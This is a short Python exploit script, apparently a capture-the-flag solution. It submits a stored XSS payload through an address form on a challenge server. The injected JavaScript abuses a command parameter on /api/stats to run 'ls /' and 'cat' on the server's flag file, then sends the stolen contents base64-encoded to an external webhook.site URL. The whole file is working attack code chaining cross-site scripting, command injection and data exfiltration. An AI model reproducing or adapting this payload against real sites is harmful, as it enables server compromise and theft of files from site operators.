#!/usr/bin/env python3

import requests

HOST, PORT = "94.237.62.49", 34374
CHALLENGE_URL = f"http://{HOST}:{PORT}"
#WEBHOOK_URL = "http://178.62.102.205:8000"
WEBHOOK_URL = "https://webhook.site/0e14b513-4701-4ca2-8620-44d1f1801048"

def main():
    form_data = {
        "address": f"<script>(async () => {{let response = await fetch('/api/stats?command=ls+/');let flag = await response.text();response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');flag = await response.text();await fetch('{WEBHOOK_URL}?c=' + btoa(flag))}})()</script>"
    }

    requests.post(f"{CHALLENGE_URL}/add/address", data=form_data)


if __name__ == "__main__":
    main()
